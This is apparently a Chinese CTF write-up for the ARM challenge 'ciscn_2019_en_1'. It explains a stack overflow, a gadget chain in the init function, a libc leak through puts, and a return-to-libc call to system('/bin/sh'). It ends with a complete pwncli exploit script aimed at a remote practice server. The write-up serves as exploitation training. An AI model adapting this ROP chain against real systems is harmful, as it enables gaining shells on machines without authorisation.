# ciscn_2019_en_1



### 总结

利用了一个组合拳`gadget`：

```
.text:00010620                 MOV     R2, R9
.text:00010624                 MOV     R1, R8
.text:00010628                 MOV     R0, R7
.text:0001062C                 BLX     R3
.text:00010630                 CMP     R4, R6
.text:00010634                 BNE     loc_10618
.text:00010638                 POP     {R4-R10,PC}
```

这一段`gadget`在`init`函数，其实和`ret2csu`有点像，可以通过`r7 r8 r9`控制`r0 r1 r2`，还能控制`pc`。

<!-- more -->

### checksec

![image-20220305234026611](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305234026611.png)

### 漏洞点

拍在脸上的栈溢出：

![image-20220305234055022](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305234055022.png)

### 利用思路

结合最上面总结的那两个`gadgets`，利用过程为：

- 控制`r7 r8 r9`而间接控制`r0 r1 r2`，而使用`0x000103a4 : pop {r3, pc}`控制`r3`
- 调用`puts(printf@got)`泄露出`libc`地址
- 再一次执行`main`函数，`rop`执行`system("/bin/sh")`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *
import shlex

context.binary = "./1"
libc = ELF("libc-2.23.so")
io = remote("node4.buuoj.cn", 25228)

io.sendafter("your name:\n\n", flat({
    36:[
        0x000103a4,
        0x103e0,
        0x00010638,
        0,0,0,0x21010,0,0,0,0x00010628,
        0, 0, 0, 0, 0, 0, 0, 0x10590]
}))

io.recvline_startswith("hello")

m = io.recvline()
log_ex(f"Get msg: {m}")

libc_base = u32_ex(m[:4]) - 0x00047b30
log_libc_base_addr(libc_base)
libc.address = libc_base


io.sendafter("your name:\n\n", flat({
    36:[
        libc_base + 0x0010dc84,
        libc.search(b"/bin/sh").__next__(),
        libc.sym.system]
}))

# 0x0011e54c : pop {r0, pc}
io.interactive()
```

远程打：

![image-20220305234540705](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220305234540705.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-03-05-ciscn-2019-en-1/  

